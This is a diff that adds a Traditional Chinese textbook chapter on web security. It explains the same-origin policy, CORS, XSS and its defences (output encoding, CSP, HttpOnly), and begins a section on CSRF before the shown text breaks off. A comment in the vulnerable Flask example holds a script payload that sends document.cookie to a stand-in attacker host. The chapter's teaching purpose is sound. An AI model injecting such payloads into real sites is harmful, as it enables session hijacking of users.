@@ -1,0 +1,1048 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web 安全 · CS 自學聖經</title>
+<meta name="description" content="Web 是人類史上最大的攻擊面:瀏覽器每天執行來自陌生伺服器的程式碼。本章從同源政策(SOP)與 CORS 出發,深入 XSS、CSRF、注入、認證與工作階段、授權(IDOR)、HTTPS/TLS、點擊劫持、SSRF、安全標頭與供應鏈,並以 OWASP Top 10 的 Web 視角、縱深防禦、威脅建模與負責任揭露收尾。立場為防禦與授權測試,程式碼皆為防禦/教學用途。">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+TC:wght@400;700&family=Noto+Sans+TC:wght@400;700&family=Lora:ital,wght@0,400;0,600;0,700;1,400&family=Inter:wght@400;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<div class="layout">
+  <main class="main">
+    <article class="content">
+
+      <div class="eyebrow">第十三部 · 進階資安</div>
+      <h1>Web 安全</h1>
+      <p class="subtitle">每天,你的瀏覽器都在做一件瘋狂的事:下載一群素未謀面的陌生人寫的程式碼,然後二話不說就在你的電腦上執行它。Web 之所以強大,正是因為它建立在「信任」之上;而 Web 之所以危險,也正是因為這份信任。這一章,我們學著如何在這片最大的攻擊面上,把信任放對地方。</p>
+      <div class="byline">
+        <span class="tag">第 52 章</span>
+        <span>閱讀時間 ≈ 70 分鐘</span>
+        <span>難度:★★★★☆</span>
+      </div>
+
+      <div class="objectives">
+        <div class="o-title">📌 讀完這一章,你會知道</div>
+        <ul>
+          <li>為什麼 Web 是<strong>史上最大的攻擊面</strong>,以及瀏覽器這個「執行陌生程式碼的沙盒」本質上的信任難題</li>
+          <li>Web 安全的基石:<strong>同源政策(same-origin policy)</strong>如何隔離不同來源,而 <strong>CORS</strong> 又如何受控地放寬它</li>
+          <li><strong>跨站腳本(XSS)</strong>的三種型態(反射型/儲存型/DOM 型),以及輸出編碼、<strong>CSP</strong>、<code>HttpOnly</code> 三道防線</li>
+          <li><strong>跨站請求偽造(CSRF)</strong>如何盜用你「已登入」的身分,以及 CSRF token 與 <code>SameSite</code> cookie 怎麼擋它</li>
+          <li>注入在 Web 的脈絡(SQL/命令注入)、認證與工作階段安全、<strong>安全 cookie 屬性</strong></li>
+          <li>授權的世界:<strong>IDOR</strong>、權限提升、功能級存取控制缺失,以及為什麼「把按鈕藏起來」不是安全</li>
+          <li>傳輸安全:HTTPS/TLS、HSTS、混合內容、憑證;以及點擊劫持、開放重新導向、<strong>SSRF</strong>、安全標頭與供應鏈漏洞</li>
+          <li>把這一切收進 <strong>OWASP Top 10</strong> 的 Web 視角、縱深防禦、威脅建模、授權測試與<strong>負責任揭露</strong>,再附一張帶得走的檢查清單</li>
+        </ul>
+      </div>
+
+      <h2>瀏覽器:一台甘願執行陌生程式碼的機器</h2>
+      <p>
+        停下來想三秒:你現在讀這頁的瀏覽器,過去一小時內可能載入了來自幾十個不同網域、
+        成千上萬行<strong>你完全沒讀過、也無法事先審查</strong>的 JavaScript。廣告商的、分析工具的、
+        留言區別人貼的……瀏覽器把它們通通下載下來,然後在<em>你的</em>機器上、用<em>你的</em>登入身分,執行了它們。
+      </p>
+      <p>
+        這在任何其他情境都是天方夜譚。沒有人會把一個來路不明的 <code>.exe</code> 雙擊執行
+        (我們在<strong>第 34 章</strong>就警告過);但在 Web 上,這件事每秒鐘發生上億次,而且我們覺得理所當然。
+        Web 的整個價值——「打開連結就能用,不必安裝」——正是建立在「瀏覽器敢執行陌生程式碼」這個大膽假設之上。
+        於是 Web 同時成了人類有史以來<strong>最大的攻擊面(attack surface)</strong>。
+      </p>
+
+      <div class="callout key">
+        <div class="ico">🔑</div>
+        <div class="body">
+          <span class="c-title">Web 安全的核心,是一個信任問題</span>
+          <p>瀏覽器的處境很弔詭:它必須<strong>執行</strong>來自陌生伺服器的程式碼,卻又必須<strong>保護</strong>使用者的資料、
+          身分與其他網站。整部 Web 安全史,可以看成在回答同一個問題:<strong>「哪些程式碼,該被允許碰哪些資料?」</strong>
+          把界線畫對了,Web 既開放又安全;畫錯一條,別人寫的腳本就能讀你的銀行 cookie。
+          本章談的每一種攻擊與防禦,骨子裡都是這條信任界線的攻防。</p>
+        </div>
+      </div>
+
+      <h3>先快速回顧:HTTP 與瀏覽器模型</h3>
+      <p>
+        Web 安全幾乎全部站在<strong>第 25 章</strong>的網路知識上,我們先把那幾塊地基喚醒。第一,Web 用的是
+        <strong>HTTP</strong> 的請求-回應模型:瀏覽器(客戶端)發出請求,伺服器回傳回應。第二,HTTP 是
+        <strong>無狀態(stateless)</strong>的——伺服器處理完一個請求就把你忘光,所以要靠 <strong>cookie</strong>
+        這張「小紙條」人工縫補出「登入狀態」的記憶。第三,瀏覽器拿到回應後,會把 HTML 解析成
+        <strong>DOM(文件物件模型)</strong>,並執行裡面的 JavaScript、套用 CSS、載入圖片與其他資源。
+      </p>
+      <p>
+        這三件事,每一件都埋著一顆安全的種子:HTTP 傳的若是明文,沿途有人能<strong>竊聽</strong>(第 25 章談過,
+        所以要 HTTPS);cookie 既然代表「你的身分」,被偷走就等於被冒充;而瀏覽器「會執行頁面裡的 JavaScript」這件事,
+        正是 XSS 的全部前提。記住這張圖,我們開始把信任的界線一條條畫出來。
+      </p>
+
+      <div class="callout note">
+        <div class="ico">⚖️</div>
+        <div class="body">
+          <span class="c-title">先講清楚:立場與界線</span>
+          <p>這一章會展示「漏洞長什麼樣、攻擊如何發生」,但所有程式碼都是<strong>防禦與教學用途</strong>——
+          我們刻意只講到「概念與成因」,不提供可以直接複製去攻擊別人網站的完整 exploit。
+          這些知識的<strong>唯一正當用途</strong>,是把你自己(與你受僱保護)的系統寫得更安全,
+          以及在<strong>明確獲得授權</strong>的前提下做安全測試。未經授權去探測、攻擊任何不屬於你的網站,
+          即使「只是看看」,在絕大多數國家都是犯罪。這條倫理與法律的界線,我們在<strong>第 36 章</strong>強調過,
+          也會在<strong>第 41 章「計算倫理」</strong>正式深入。理解攻擊,是為了更好地防守。</p>
+        </div>
+      </div>
+
+      <h2>Web 安全的基石:同源政策</h2>
+      <p>
+        如果瀏覽器真的「來者不拒」地讓任何頁面的腳本碰任何資料,Web 一天都活不下去:你開著網路銀行的分頁,
+        另一個分頁裡某個惡意網站的 JavaScript,就能直接讀走你銀行頁面的內容、偷走你的 cookie、替你按下「轉帳」。
+        是什麼東西在阻止這場災難?答案是 Web 安全最重要、卻最少被提起的基石:<strong>同源政策(same-origin policy,SOP)</strong>。
+      </p>
+      <p>
+        同源政策的規則一句話就能說完:<strong>一個來源(origin)的程式碼,預設只能存取「同一個來源」的資料,
+        不能去讀其他來源的東西。</strong>那麼,什麼叫「同一個來源」?所謂<strong>來源</strong>,是由三樣東西組成的:
+        <strong>協定(scheme)+ 主機(host)+ 連接埠(port)</strong>。三者<em>完全相同</em>,才算同源;
+        只要差一個,瀏覽器就視為不同來源,互相隔離。
+      </p>
+
+      <div class="diagram">
+<svg viewBox="0 0 720 360" xmlns="http://www.w3.org/2000/svg" font-family="Inter, 'Noto Sans TC', sans-serif">
+  <text x="360" y="26" text-anchor="middle" font-size="13" font-weight="800" fill="#1f2328">同源政策:誰能存取誰?</text>
+  <!-- base origin -->
+  <text x="40" y="58" font-size="12" font-weight="700" fill="#2f6f6a">基準來源(我的頁面):</text>
+  <rect x="40" y="66" width="640" height="34" rx="6" fill="#e3efed" stroke="#2f6f6a" stroke-width="2"/>
+  <text x="56" y="88" font-size="13" font-family="monospace" fill="#1f2328"><tspan fill="#2f6f6a" font-weight="700">https</tspan>://<tspan fill="#b4541f" font-weight="700">bank.example.com</tspan>:<tspan fill="#8b5cf6" font-weight="700">443</tspan>/account</text>
+
+  <text x="40" y="128" font-size="12" font-weight="700" fill="#8a929b">把下列來源拿來比對(協定 + 主機 + 埠,三者全同才算同源):</text>
+
+  <!-- rows -->
+  <g font-family="monospace" font-size="12.5">
+    <rect x="40" y="142" width="500" height="30" rx="5" fill="#eafaf0" stroke="#2f9e5b"/>
+    <text x="56" y="162" fill="#1f2328">https://bank.example.com/transfer</text>
+    <text x="560" y="162" font-family="Inter, 'Noto Sans TC', sans-serif" font-size="12" font-weight="700" fill="#2f9e5b">✓ 同源(只有路徑不同)</text>
+
+    <rect x="40" y="178" width="500" height="30" rx="5" fill="#fdece5" stroke="#b4541f"/>
+    <text x="56" y="198" fill="#1f2328"><tspan fill="#b4541f" font-weight="700">http</tspan>://bank.example.com/</text>
+    <text x="560" y="198" font-family="Inter, 'Noto Sans TC', sans-serif" font-size="12" font-weight="700" fill="#b4541f">✗ 協定不同</text>
+
+    <rect x="40" y="214" width="500" height="30" rx="5" fill="#fdece5" stroke="#b4541f"/>
+    <text x="56" y="234" fill="#1f2328">https://<tspan fill="#b4541f" font-weight="700">evil.example.com</tspan>/</text>
+    <text x="560" y="234" font-family="Inter, 'Noto Sans TC', sans-serif" font-size="12" font-weight="700" fill="#b4541f">✗ 主機不同</text>
+
+    <rect x="40" y="250" width="500" height="30" rx="5" fill="#fdece5" stroke="#b4541f"/>
+    <text x="56" y="270" fill="#1f2328">https://bank.example.com:<tspan fill="#b4541f" font-weight="700">8080</tspan>/</text>
+    <text x="560" y="270" font-family="Inter, 'Noto Sans TC', sans-serif" font-size="12" font-weight="700" fill="#b4541f">✗ 連接埠不同</text>
+  </g>
+
+  <text x="360" y="312" text-anchor="middle" font-size="11" fill="#4a5159">「✓ 同源」的頁面腳本能自由讀寫彼此的 DOM、cookie、回應內容;</text>
+  <text x="360" y="330" text-anchor="middle" font-size="11" fill="#4a5159">「✗ 不同源」之間預設被瀏覽器隔離——這道牆,擋掉了無數攻擊。</text>
+</svg>
+        <figcaption>圖 52-1:同源政策。來源 = 協定 + 主機 + 埠,三者全同才算同源。同源之間互信,不同源之間預設隔離。注意:路徑(<code>/account</code> vs <code>/transfer</code>)不影響來源判定。</figcaption>
+      </div>
+
+      <p>
+        同源政策是一道<strong>沉默的英雄</strong>:它在背景默默運作,你幾乎感覺不到它,但正是它讓你能同時開著網銀和不信任的網站,
+        而後者偷不到前者的資料。它管的主要是「<strong>讀取</strong>」:<code>evil.com</code> 的腳本可以<em>發出</em>一個請求到
+        <code>bank.com</code>(這點很重要,等一下談 CSRF 時會回來),但它<strong>讀不到那個回應的內容</strong>,也讀不到
+        <code>bank.com</code> 分頁的 DOM 與 cookie。隔離的是「跨來源讀資料」這件事。
+      </p>
+
+      <h3>CORS:受控地把牆打開一道門</h3>
+      <p>
+        同源政策很安全,但有時候<strong>太安全了</strong>。現代網站常把前端(<code>https://app.example.com</code>)
+        和後端 API(<code>https://api.example.com</code>)放在不同來源;前端的 JavaScript 需要去呼叫後端 API、
+        而且要能<strong>讀到回應</strong>。可是它們不同源,SOP 預設會擋掉。怎麼辦?
+      </p>
+      <p>
+        答案是 <strong>CORS(Cross-Origin Resource Sharing,跨來源資源共享)</strong>。它不是「繞過」同源政策,
+        而是一套<strong>由伺服器主動授權</strong>的機制:被請求的那台伺服器,可以在回應裡加上一個標頭,明白宣告
+        「我<em>允許</em>來自某某來源的頁面讀取我的回應」。瀏覽器看到這個許可,才放行;沒有,就維持隔離。
+      </p>
+      <pre><code class="language-text">回應標頭(由 api.example.com 發出,授權 app.example.com 讀取它):
+Access-Control-Allow-Origin: https://app.example.com
+Access-Control-Allow-Credentials: true</code></pre>
+      <p>
+        關鍵觀念是:<strong>放行的決定權在「被存取的伺服器」手上,而不是在發起請求的頁面</strong>。
+        這個方向很重要——它意味著惡意網站<em>無法</em>自己宣告「我可以讀 bank.com」,因為那個許可只有 bank.com 自己能發。
+      </p>
+
+      <div class="callout warn">
+        <div class="ico">⚠️</div>
+        <div class="body">
+          <span class="c-title">CORS 最常見的致命設定錯誤</span>
+          <p>很多人被 CORS 擋到、又懶得查文件,就直接設成 <code>Access-Control-Allow-Origin: *</code>
+          (允許「任何來源」讀取)。對<strong>公開、無須登入</strong>的資料,這沒問題;但若這個 API 會回傳
+          <strong>使用者的私密資料</strong>、又同時允許帶 cookie,等於親手拆掉同源政策這道牆——任何網站都能讀你的私密回應。
+          更糟的是「把請求的 Origin 原封不動反射回去」當作 Allow-Origin,效果等同 <code>*</code> 卻還能帶憑證。
+          原則:<strong>只白名單列出你真正信任的來源,絕不對「需要憑證的私密 API」開放萬用字元。</strong>
+          CORS 是「故意開的一扇門」,不是「拆掉整道牆」。</p>
+        </div>
+      </div>
+
+      <h2>跨站腳本攻擊(XSS):把腳本注入別人的瀏覽器</h2>
+      <p>
+        我們在<strong>第 36 章</strong>把 XSS 歸進「注入家族」,並預告完整版留到本章。現在兌現。
+        <strong>跨站腳本(Cross-Site Scripting,XSS)</strong>的核心,是攻擊者想辦法讓<strong>他寫的 JavaScript</strong>,
+        在<strong>受害者的瀏覽器</strong>裡、以<strong>受害者所在網站的身分</strong>執行。一旦得逞,那段腳本就站在了
+        同源政策的「牆內」——它能讀該網站的 DOM、偷該網站的 cookie、冒充使用者發請求,幾乎無所不能。
+      </p>
+      <p>
+        為什麼會發生?還是那句老話:<strong>資料被當成了程式碼</strong>。當網站把使用者提供的內容,
+        「原封不動」地嵌進 HTML 頁面裡,而那段內容裡藏著 <code>&lt;script&gt;</code>,瀏覽器分不出
+        「這是該顯示的文字」還是「這是該執行的腳本」,就照單全收地執行了。依「惡意腳本怎麼送達受害者」的不同,
+        XSS 分成三種型態。
+      </p>
+
+      <h3>三種 XSS:反射型、儲存型、DOM 型</h3>
+      <ul>
+        <li><strong>反射型(reflected):</strong>惡意腳本藏在<strong>網址或請求參數</strong>裡,被伺服器「反射」進當下的回應頁面。
+        攻擊者得先<strong>誘騙</strong>受害者點一個特製連結(例如釣魚信裡的網址)。腳本不會被保存,只在那一次回應裡出現。</li>
+        <li><strong>儲存型(stored):</strong>最危險的一種。惡意腳本被<strong>存進伺服器</strong>(留言、暱稱、商品評論……),
+        之後<strong>每一個</strong>瀏覽到該頁面的使用者都會中招——不需誘騙、自動散播,像一顆埋在資料庫裡的地雷。</li>
+        <li><strong>DOM 型(DOM-based):</strong>漏洞完全發生在<strong>前端 JavaScript</strong>:腳本把不可信的資料
+        (如 <code>location.hash</code>)直接寫進頁面,壓根沒經過伺服器。是純客戶端的注入。</li>
+      </ul>
+
+      <p>來看儲存型 XSS 的完整劇本——它最能說明「為什麼一個沒編碼的輸出能造成連鎖災難」:</p>
+
+      <div class="diagram">
+<svg viewBox="0 0 720 380" xmlns="http://www.w3.org/2000/svg" font-family="Inter, 'Noto Sans TC', sans-serif">
+  <defs>
+    <marker id="xss-a" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#b4541f"/></marker>
+    <marker id="xss-b" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#8a929b"/></marker>
+  </defs>
+  <!-- actors -->
+  <rect x="30" y="40" width="130" height="48" rx="8" fill="#fdece5" stroke="#b4541f" stroke-width="2"/>
+  <text x="95" y="60" text-anchor="middle" font-size="12" font-weight="800" fill="#b4541f">攻擊者</text>
+  <text x="95" y="78" text-anchor="middle" font-size="10" fill="#4a5159">寫一則惡意留言</text>
+
+  <rect x="295" y="40" width="150" height="48" rx="8" fill="#e3efed" stroke="#2f6f6a" stroke-width="2"/>
+  <text x="370" y="60" text-anchor="middle" font-size="12" font-weight="800" fill="#2f6f6a">論壇伺服器</text>
+  <text x="370" y="78" text-anchor="middle" font-size="10" fill="#4a5159">把留言存進資料庫</text>
+
+  <rect x="560" y="40" width="130" height="48" rx="8" fill="#ede9fe" stroke="#8b5cf6" stroke-width="2"/>
+  <text x="625" y="60" text-anchor="middle" font-size="12" font-weight="800" fill="#8b5cf6">受害者</text>
+  <text x="625" y="78" text-anchor="middle" font-size="10" fill="#4a5159">只是來看留言</text>
+
+  <!-- step 1 -->
+  <line x1="160" y1="120" x2="293" y2="120" stroke="#b4541f" stroke-width="2.2" marker-end="url(#xss-a)"/>
+  <text x="226" y="112" text-anchor="middle" font-size="11" font-weight="700" fill="#b4541f">① 送出留言</text>
+  <text x="226" y="138" text-anchor="middle" font-size="10" font-family="monospace" fill="#4a5159">&lt;script&gt;…&lt;/script&gt;</text>
+
+  <!-- store -->
+  <rect x="300" y="158" width="140" height="34" rx="6" fill="#fff" stroke="#2f6f6a"/>
+  <text x="370" y="180" text-anchor="middle" font-size="11" fill="#1f2328">② 原封不動存起來</text>
+
+  <!-- step 3 victim requests page -->
+  <line x1="560" y1="215" x2="442" y2="215" stroke="#8a929b" stroke-width="2" marker-end="url(#xss-b)"/>
+  <text x="500" y="207" text-anchor="middle" font-size="11" font-weight="700" fill="#8a929b">③ 開啟頁面</text>
+
+  <!-- step 4 server returns page with script -->
+  <line x1="442" y1="250" x2="560" y2="250" stroke="#b4541f" stroke-width="2.2" marker-end="url(#xss-a)"/>
+  <text x="500" y="242" text-anchor="middle" font-size="11" font-weight="700" fill="#b4541f">④ 回傳含惡意腳本的 HTML</text>
+
+  <!-- step 5 script runs in victim browser -->
+  <rect x="540" y="278" width="170" height="56" rx="8" fill="#fdece5" stroke="#b4541f" stroke-width="2"/>
+  <text x="625" y="300" text-anchor="middle" font-size="11" font-weight="800" fill="#b4541f">⑤ 腳本在受害者瀏覽器執行</text>
+  <text x="625" y="318" text-anchor="middle" font-size="10" fill="#4a5159">讀 document.cookie → 外傳</text>
+
+  <line x1="540" y1="306" x2="170" y2="306" stroke="#b4541f" stroke-width="1.6" stroke-dasharray="5 3" marker-end="url(#xss-a)"/>
+  <text x="350" y="298" text-anchor="middle" font-size="10.5" fill="#b4541f">⑥ cookie / session 被偷回攻擊者手上 → 冒充受害者登入</text>
+</svg>
+        <figcaption>圖 52-2:儲存型 XSS 的傳播鏈(概念示意)。攻擊者把腳本「存」進伺服器,之後每個瀏覽該頁面的使用者都會在自己的瀏覽器裡執行它。腳本以受害者的身分讀取 cookie 並外傳,攻擊者便能冒充登入。一次注入,持續傷害。</figcaption>
+      </div>
+
+      <p>
+        看一段會出事的後端程式碼(Flask 偽碼),以及它為什麼危險:
+      </p>
+      <pre><code class="language-python"># ⛔ 危險:把使用者留言「原封不動」拼進 HTML
+@app.route("/comment")
+def show_comment():
+    text = get_latest_comment()          # 例如使用者存的內容含 &lt;script&gt;
+    return "&lt;div class='comment'&gt;" + text + "&lt;/div&gt;"
+    # 若 text = "&lt;script&gt;fetch('//evil.example/?c='+document.cookie)&lt;/script&gt;"
+    # 這段腳本就會在每個讀者的瀏覽器裡執行,把他們的 cookie 外傳給攻擊者</code></pre>
+
+      <p>
+        問題的根源,跟 SQL 注入一模一樣:程式把「資料」直接拼進了一個會被「直譯器」(這裡是瀏覽器的 HTML 解析器)
+        解讀的字串。解法也同出一轍——讓資料<strong>永遠以「純文字」的身分</strong>進入 HTML,而不是以「標籤」。
+      </p>
+
+      <h3>第一道防線:輸出編碼 / 脫逸</h3>
+      <p>
+        <strong>輸出編碼(output encoding / escaping)</strong>是 XSS 最根本的解法:在把資料寫進 HTML 之前,
+        先把那些有「語法意義」的字元,轉成對應的 <strong>HTML 實體(entity)</strong>。最關鍵的五個字元是:
+      </p>
+      <div class="table-wrap">
+      <table>
+        <thead><tr><th>原字元</th><th>編碼成</th><th>為什麼危險</th></tr></thead>
+        <tbody>
+          <tr><td><code>&lt;</code></td><td><code>&amp;lt;</code></td><td>開啟標籤(如 <code>&lt;script&gt;</code>)</td></tr>
+          <tr><td><code>&gt;</code></td><td><code>&amp;gt;</code></td><td>關閉標籤</td></tr>
+          <tr><td><code>&amp;</code></td><td><code>&amp;amp;</code></td><td>實體的起頭</td></tr>
+          <tr><td><code>"</code></td><td><code>&amp;quot;</code></td><td>跳出 HTML 屬性的雙引號</td></tr>
+          <tr><td><code>'</code></td><td><code>&amp;#x27;</code></td><td>跳出 HTML 屬性的單引號</td></tr>
+        </tbody>
+      </table>
+      </div>
+      <p>
+        經過編碼後,瀏覽器會把 <code>&amp;lt;script&amp;gt;</code> <strong>顯示成文字「&lt;script&gt;」</strong>,
+        而不是「執行一段腳本」。資料被當回了資料。來看 before / after(防禦角度):
+      </p>
+      <pre><code class="language-python">from markupsafe import escape
+
+# ❌ before:直接拼接,使用者輸入會被當 HTML 解析
+def render(text):
+    return "&lt;div class='comment'&gt;" + text + "&lt;/div&gt;"
+
+# ✅ after:對資料做 HTML 輸出編碼,&lt; &gt; &amp; " ' 全被轉成實體
+def render(text):
+    return "&lt;div class='comment'&gt;" + str(escape(text)) + "&lt;/div&gt;"
+    # escape("&lt;script&gt;x&lt;/script&gt;") → "&amp;lt;script&amp;gt;x&amp;lt;/script&amp;gt;"
+    # 瀏覽器把它當文字顯示,不會執行</code></pre>
+
+      <div class="callout tip">
+        <div class="ico">💡</div>
+        <div class="body">
+          <span class="c-title">好消息:現代框架預設就幫你編碼</span>
+          <p>你大概不必手動呼叫 <code>escape</code>。<strong>Jinja2、React、Vue、Angular</strong> 這些現代模板/框架,
+          在你用「正規方式」輸出變數時(Jinja 的 <code>{{ text }}</code>、React 的 <code>{text}</code>),
+          <strong>預設就會自動做 HTML 編碼</strong>。XSS 的洞,往往出在你「繞過」了這個保護:
+          用了 <code>render_template_string</code> 拼字串、用了 React 的 <code>dangerouslySetInnerHTML</code>、
+          或在前端直接寫 <code>element.innerHTML = userInput</code>。看到名字裡有 <code>danger</code>、或在「手動拼 HTML」時,
+          就該警鈴大作。<strong>順著框架走,而不是繞過它</strong>,你已經擋掉九成的 XSS。</p>
+        </div>
+      </div>
+
+      <p>
+        補一句 DOM 型 XSS 的防禦:當你在前端 JavaScript 裡要把資料放進頁面時,用
+        <code>element.textContent = data</code>(把資料當<strong>純文字</strong>放),
+        而不是 <code>element.innerHTML = data</code>(把資料當 <strong>HTML</strong> 解析)。
+        這個一字之差,就是「安全」與「注入」之差。
+      </p>
+
+      <h3>第二道防線:內容安全政策(CSP)</h3>
+      <p>
+        輸出編碼是治本,但人會漏。萬一真的漏了一個沒編碼的輸出,還有沒有第二層網?有——
+        <strong>內容安全政策(Content Security Policy,CSP)</strong>。它是一個由伺服器發出的 HTTP 標頭,
+        告訴瀏覽器:<strong>「這個頁面,只准執行/載入來自這些來源的資源。」</strong>
+      </p>
+      <pre><code class="language-text">回應標頭:
+Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'</code></pre>
+      <p>
+        上面這條政策的意思是:腳本(<code>script-src</code>)只能從<strong>本站自己</strong>(<code>'self'</code>)載入。
+        於是,就算攻擊者成功把 <code>&lt;script&gt;...&lt;/script&gt;</code> 注入進頁面,瀏覽器也會<strong>拒絕執行</strong>
+        那段「行內(inline)」腳本——因為政策沒允許 inline。CSP 把「萬一漏了一個 XSS」的後果,
+        從「腳本照跑」降級成「腳本被瀏覽器擋下」。這正是<strong>縱深防禦</strong>的精神:不把所有希望押在單一道防線。
+      </p>
+
+      <div class="callout note">
+        <div class="ico">ℹ️</div>
+        <div class="body">
+          <span class="c-title">CSP 是「減災」,不是「免死金牌」</span>
+          <p>CSP 很強,但別把它當成不做輸出編碼的藉口。它有眉角:設定不當(例如為了相容而加了
+          <code>'unsafe-inline'</code>)會讓保護形同虛設;舊瀏覽器支援度也不一。把它當作<strong>第二層保險</strong>——
+          第一層永遠是「正確的輸出編碼」。兩層一起上,才穩。</p>
+        </div>
+      </div>
+
+      <h3>第三道防線:HttpOnly cookie</h3>
+      <p>
+        XSS 最常見的目的之一,是偷 cookie(尤其是 session cookie)拿去冒充你。那能不能讓「JavaScript 根本讀不到 cookie」?
+        可以——在 cookie 上加 <code>HttpOnly</code> 屬性:
+      </p>
+      <pre><code class="language-text">Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax</code></pre>
+      <p>
+        加了 <code>HttpOnly</code> 之後,這個 cookie 只會被瀏覽器在發 HTTP 請求時自動附上,
+        但 <strong><code>document.cookie</code> 讀不到它</strong>。如此一來,即使頁面被 XSS 攻陷,
+        那段惡意腳本也偷不走 session cookie。這不能阻止 XSS 發生,但能<strong>大幅降低它的危害</strong>——
+        又是一層縱深防禦。(同一行裡的 <code>Secure</code> 與 <code>SameSite</code> 等屬性,我們在後面工作階段那節細談。)
+      </p>
+
+      <div class="exercise">
+        <div class="ex-head">✏️ 練習 52.1 <span class="badge">實作</span></div>
+        <div class="ex-body">
+          <p>下面這個 Flask 端點有反射型 XSS 漏洞:它把網址參數 <code>q</code> 直接拼進回應頁面,顯示「您搜尋了:...」。
+          請(a)說明攻擊者大致會構造什麼樣的連結來觸發 XSS、會造成什麼後果;(b)把它改寫成安全版本(輸出編碼)。
+          (c)再補一句:除了編碼,你還會加哪一個 HTTP 標頭當第二層防線?</p>
+          <pre><code class="language-python">@app.route("/search")
+def search():
+    q = request.args.get("q", "")
+    return "&lt;h1&gt;您搜尋了:" + q + "&lt;/h1&gt;"</code></pre>
+          <details class="solution">
+            <summary>看解答</summary>
+            <div class="sol-body">
+              <p><strong>(a) 攻擊與後果:</strong>因為 <code>q</code> 被原封不動拼進 HTML,攻擊者可構造一個連結,
+              讓 <code>q</code> 的值帶有 <code>&lt;script&gt;...&lt;/script&gt;</code> 之類的內容(例如把竊取 cookie 的腳本塞進去),
+              再透過釣魚信、social media 等管道<strong>誘騙受害者點擊</strong>。受害者一點開,腳本就在他的瀏覽器裡、
+              以這個網站的身分執行:可以偷 cookie、冒充身分、竄改畫面。這是典型的<strong>反射型 XSS</strong>——
+              惡意內容來自網址、被伺服器反射進回應。</p>
+              <p><strong>(b) 修正(輸出編碼):</strong>把 <code>q</code> 編碼後再放進 HTML。最好直接用模板讓它自動編碼:</p>
+              <pre><code class="language-python">from markupsafe import escape
+
+@app.route("/search")
+def search():
+    q = request.args.get("q", "")
+    return "&lt;h1&gt;您搜尋了:" + str(escape(q)) + "&lt;/h1&gt;"
+    # 更好的做法:用 render_template + {{ q }},讓 Jinja2 自動編碼</code></pre>
+              <p>編碼後,<code>&lt;</code> <code>&gt;</code> 等字元變成 HTML 實體,瀏覽器會把使用者輸入「顯示成文字」而非「執行成腳本」。</p>
+              <p><strong>(c) 第二層防線:</strong>加上 <strong>CSP</strong> 標頭(如
+              <code>Content-Security-Policy: default-src 'self'</code>),這樣即使哪天又漏了一個沒編碼的輸出,
+              瀏覽器也會拒絕執行注入的 inline 腳本。再搭配 session cookie 的 <code>HttpOnly</code>,
+              讓腳本就算跑起來也偷不到 session。三層疊加,就是縱深防禦。</p>
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <h2>跨站請求偽造(CSRF):盜用你「已登入」的身分</h2>
+      <p>
+        XSS 偷的是「你的資料」;接下來這種攻擊更陰險,它偷的是「你的<strong>身分與意圖</strong>」。
+        <strong>跨站請求偽造(Cross-Site Request Forgery,CSRF)</strong>利用的是一個你習以為常、卻暗藏風險的瀏覽器行為:
+        <strong>瀏覽器發請求到某個網站時,會「自動」帶上該網站的 cookie——不管這個請求是從哪個頁面發起的。</strong>
+      </p>
+      <p>
+        把這個行為和「cookie 代表你的登入身分」放在一起,問題就浮現了:假設你剛在
+        <code>bank.example.com</code> 登入(瀏覽器存了你的 session cookie),然後你在<strong>同一個瀏覽器</strong>
+        裡開了另一個分頁,逛到一個惡意網站 <code>evil.example</code>。那個惡意頁面裡藏了一段程式,
+        悄悄對 <code>bank.example.com/transfer</code> 發出一個轉帳請求。瀏覽器一看是發給 <code>bank.example.com</code> 的,
+        就<strong>很「貼心」地把你的 session cookie 自動附上去</strong>——於是銀行收到一個「帶著你有效登入憑證」的轉帳請求,
+        以為是你本人操作,照辦了。
+      </p>
+
+      <div class="diagram">
+<svg viewBox="0 0 720 360" xmlns="http://www.w3.org/2000/svg" font-family="Inter, 'Noto Sans TC', sans-serif">
+  <defs>
+    <marker id="csrf-a" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#b4541f"/></marker>
+    <marker id="csrf-b" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#2f6f6a"/></marker>
+  </defs>
+  <text x="360" y="24" text-anchor="middle" font-size="13" font-weight="800" fill="#1f2328">CSRF:借刀殺人,刀是「你的瀏覽器」</text>
+
+  <!-- victim browser -->
+  <rect x="40" y="120" width="160" height="120" rx="10" fill="#ede9fe" stroke="#8b5cf6" stroke-width="2"/>
+  <text x="120" y="146" text-anchor="middle" font-size="12" font-weight="800" fill="#8b5cf6">受害者的瀏覽器</text>
+  <text x="120" y="168" text-anchor="middle" font-size="10" fill="#4a5159">已登入 bank.example.com</text>
+  <rect x="60" y="182" width="120" height="40" rx="6" fill="#fff" stroke="#8b5cf6"/>
+  <text x="120" y="200" text-anchor="middle" font-size="10" fill="#1f2328">存有 bank 的</text>
+  <text x="120" y="214" text-anchor="middle" font-size="10" font-weight="700" fill="#8b5cf6">session cookie</text>
+
+  <!-- evil site -->
+  <rect x="280" y="46" width="180" height="64" rx="10" fill="#fdece5" stroke="#b4541f" stroke-width="2"/>
+  <text x="370" y="70" text-anchor="middle" font-size="12" font-weight="800" fill="#b4541f">evil.example</text>
+  <text x="370" y="90" text-anchor="middle" font-size="10" fill="#4a5159">頁面藏著自動送出的表單</text>
+
+  <!-- bank -->
+  <rect x="540" y="120" width="150" height="120" rx="10" fill="#e3efed" stroke="#2f6f6a" stroke-width="2"/>
